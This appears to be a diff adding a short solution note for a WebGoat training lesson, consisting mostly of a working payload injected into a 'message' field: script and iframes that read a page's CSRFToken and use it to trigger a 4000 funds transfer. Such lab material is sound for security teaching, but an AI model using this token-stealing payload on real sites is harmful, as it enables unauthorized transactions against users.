@@ -1,0 +1,19 @@
+The following script and html is added to the exploitable 'message' field:
+
+<script>
+  function readAndLoadFrames(){
+    var elem1=document.getElementById("f1");
+    var f1d=(elem1.contentWindow||elem1.contentDocument);
+    var elem2=document.getElementById("f2");
+    var f2d=(elem2.contentWindow||elem2.contentDocument);
+    f2d.location="http://localhost:8080/WebGoat/attack?Screen=275&menu=900&transferFunds=4000&CSRFToken="
++ f1d.document.getElementsByName("CSRFToken")[0].value;
+  }
+</script>
+<iframe id="f2"  style="display:block"  src=""></iframe>
+<iframe id="f1" style="display:block"
+src="http://localhost:8080/WebGoat/attack?Screen=275&menu=900&transferFunds=main"
+onload="setTimeout('readAndLoadFrames()',1000)"></iframe>
+
+Frame #1 (id=f1) loads the main attack page, the js script extracts the token
+and issues the next frame to transfer funds with this token.
